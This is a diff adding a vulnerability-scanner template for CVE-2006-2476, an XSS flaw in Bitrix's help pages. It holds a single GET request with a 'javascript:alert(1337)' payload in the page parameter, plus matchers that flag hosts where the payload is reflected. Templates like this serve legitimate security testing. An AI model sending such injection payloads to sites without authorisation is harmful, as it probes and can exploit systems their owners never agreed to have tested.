@@ -1,0 +1,23 @@
+id: CVE-2006-2476
+
+info:
+  name: Bitrix XSS - CVE-2006-2476
+  author: 0x_Akoko
+  severity: medium
+  tags: cve,cve2006,xss,bitrix
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/bitrix/help/en/index.html?page=javascript:alert(1337)//"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "javascript:alert(1337)"
+        part: body
+
+      - type: status
+        status:
+          - 200
